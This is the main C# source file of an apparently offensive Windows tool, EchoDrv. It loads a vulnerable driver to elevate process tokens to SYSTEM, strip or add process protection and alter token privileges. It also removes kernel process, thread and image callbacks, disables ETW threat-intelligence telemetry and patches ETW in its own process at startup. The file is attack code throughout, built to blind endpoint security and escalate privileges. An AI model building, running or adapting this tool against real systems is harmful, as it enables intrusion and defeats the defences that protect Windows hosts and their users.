using System;
using System.Diagnostics;
using System.Linq;
using ISyscall;

namespace EchoDrv
{
    internal class Program
    {
        public static Isyscall isyscall = new Isyscall();
        public static IntPtr ntdeviceptr;
        public static IntPtr procHandle;
        public static IntPtr hDriver;

        static void Help()
        {
            Console.WriteLine(@"" +
                "--path - Path to driver sys file (default 'echo_driver.sys' into current folder)\n" +
                "--load - Load embedded driver (no need to upload to disk)\n" +
                "--add-protection [processID] - Enable PS_PROTECTED_LSA_LIGHT protection on process ID\n" +
                "--remove-protection [processID] - Remove any protection on process ID\n" +
                "--switch-priv [processID] [DEBUG|LOAD_DRIVER|IMPERSONATE|BACKUP|RESTORE|DELEGATE|TOKEN|TCB|ALL] [present|enabled|default] - Add/Remove priv from _TOKEN.Privilege\n" +
                "--untrusted - Set target process to Untrusted integrity level\n" +
                "--elevate [processID] - Elevate processID to system\n" +
                "--list-callback [callback_type] - Liste drivers registered to specified callbacks type [process|thread|image]\n" +
                "--remove-callback [callback_type] [callback_index] - Remove callbacks from specified callback array [process|thread|image]\n" +
                "--remove-all [callback_type] - Remove all callbacks from specified callback array (20 first) [process|thread|image]\n" +
                "--restore-callback [callback_type] [callback_index] [callback_address] - Restore callback address to specified callback array [process|thread|image]\n" +
                "--disable-etwti - Disable ETWTI by setting ProviderEnableInfo to 0\n" +
                "--enable-etwti - Enable ETWTI by setting ProviderEnableInfo to 1\n" +
                "--unload - Unload driver, cleanup registry and remove local driver file\n" +
                "--help, -h - Display help" +
                "");
            return;
        }

        static int GetArgsProcId(string arg)
        {
            if (!int.TryParse(arg, out int processid))
            {
                Console.WriteLine("Wrong process id");
                return 0;
            }

            return processid;
        }

        public static void Main(string[] args)
        {
            bool load = false;
            bool unload = false;
            bool remove_protection = false;
            bool add_protection = false;
            bool elevate = false;
            bool list_callback = false;
            bool remove_callback = false;
            bool remove_all = false;
            bool restore_callback = false;
            bool switch_priv = false;
            bool disable_etwti = false;
            bool enable_etwti = false;
            bool untrusted = false;
            bool output = false;
            int processid = 0;
            int callback_index = 0;
            ulong callback_address = 0;
            string field = String.Empty;
            string callback_type = String.Empty;
            string driverPath = System.AppDomain.CurrentDomain.BaseDirectory + "echo_driver.sys";
            Driver.PRIVS priv = Driver.PRIVS.NONE;

            foreach (string arg in args)
            {
                if (arg.Equals("--path"))
                {
                    int i = Array.IndexOf(args, arg);
                    driverPath = args[i + 1];
                }
                if (arg.Equals("--load"))
                {
                    load = true;
                }
                if (arg.Equals("--unload"))
                {
                    unload = true;
                }
                if (arg.Equals("--add-protection"))
                {
                    add_protection = true;
                    int i = Array.IndexOf(args, arg);
                    processid = GetArgsProcId(args[i + 1]);
                }
                if (arg.Equals("--remove-protection"))
                {
                    remove_protection = true;
                    int i = Array.IndexOf(args, arg);
                    processid = GetArgsProcId(args[i + 1]);
                }
                if (arg.Equals("--elevate"))
                {
                    elevate = true;
                    int i = Array.IndexOf(args, arg);
                    processid = GetArgsProcId(args[i + 1]);
                }
                if (arg.Equals("--untrusted"))
                {
                    untrusted = true;
                    int i = Array.IndexOf(args, arg);
                    processid = GetArgsProcId(args[i + 1]);
                }
                if (arg.Equals("--switch-priv"))
                {
                    switch_priv = true;
                    int i = Array.IndexOf(args, arg);
                    processid = GetArgsProcId(args[i + 1]);
                    field = args[i + 3];
                    if (!Enum.TryParse<Driver.PRIVS>(args[i + 2], true, out priv))
                    {
                        Console.WriteLine("Wrong privilege, must be 'debug|load_driver|all'");
                        return;
                    }
                }
                if (arg.Equals("--list-callback"))
                {
                    list_callback = true;
                    int i = Array.IndexOf(args, arg);
                    callback_type = args[i + 1];
                }
                if (arg.Equals("--remove-all"))
                {
                    remove_all = true;
                    int i = Array.IndexOf(args, arg);
                    callback_type = args[i + 1];
                }
                if (arg.Equals("--remove-callback"))
                {
                    remove_callback = true;
                    int i = Array.IndexOf(args, arg);
                    callback_type = args[i + 1];
                    callback_index = int.Parse(args[i + 2]);
                }
                if (arg.Equals("--restore-callback"))
                {
                    restore_callback = true;
                    int i = Array.IndexOf(args, arg);
                    callback_type = args[i + 1];
                    callback_index = int.Parse(args[i + 2]);
                    callback_address = Convert.ToUInt64(args[i + 3], 16);
                }
                if (arg.Equals("--disable-etwti"))
                {
                    disable_etwti = true;
                }
                if (arg.Equals("--enable-etwti"))
                {
                    enable_etwti = true;
                }
                if (arg.Equals("--output"))
                {
                    output = true;
                }
                if (arg.Equals("--help") || arg.Equals("-h"))
                {
                    Help();
                    return;
                }
            }

            isyscall.PatchETW();
            ntdeviceptr = Program.isyscall.GetSyscallPtr("NtDeviceIoControlFile");
            string ServiceName = "EchoDrv";

            if (load)
            {
                if (!System.IO.File.Exists(driverPath))
                {
                    Console.WriteLine("Driver file not found! Use --path");
                    return;
                }
                if (!Driver.Load(driverPath, ServiceName))
                    return;
            }

            if (!Driver.Initialize(out procHandle, out hDriver))
            {
                Console.WriteLine("Driver initialization failed! Cleaning..");
                Driver.Cleanup(driverPath, ServiceName);
                return;
            }

            if (processid > 0)
            {
                if (!Process.GetProcesses().Any(x => x.Id == processid))
                {
                    Console.WriteLine("Invalid process id");
                    return;
                }

                if (!Utils.getVersionOffsets(out Data.Offsets offsets))
                    return;

                if (add_protection)
                {
                    Driver.changeProcessProtection((IntPtr)processid, offsets, false);
                }

                if (remove_protection)
                {
                    Driver.changeProcessProtection((IntPtr)processid, offsets, true);
                }

                if (elevate)
                {
                    Driver.ElevateProcessToken((IntPtr)processid, offsets);
                }

                if (switch_priv)
                {
                    Driver.SwitchPrivs((IntPtr)processid, offsets, priv, field);
                }

                if (untrusted)
                {
                    Driver.SetUntrustedIntegrityProcess((IntPtr)processid, offsets);
                }
            }


            if (list_callback)
            {
                Driver.ListCallbacks(callback_type, output);
            }

            if (remove_callback)
            {
                Driver.RemoveCallback(callback_type, callback_index);
            }

            if (restore_callback)
            {
                Driver.RestoreCallback(callback_type, callback_index, callback_address);
            }

            if (remove_all)
            {
                Driver.RemoveAllCallbacks(callback_type);
            }

            if (disable_etwti)
            {
                if (!Utils.getVersionOffsets(out Data.Offsets offsets))
                    return;
                Driver.DisableETWTI(offsets, output);
            }

            if (enable_etwti)
            {
                if (!Utils.getVersionOffsets(out Data.Offsets offsets))
                    return;
                Driver.EnableETWTI(offsets, output);
            }

            if (unload)
            {
                Driver.Cleanup(driverPath, ServiceName);
            }

            return;
        }
    }
}

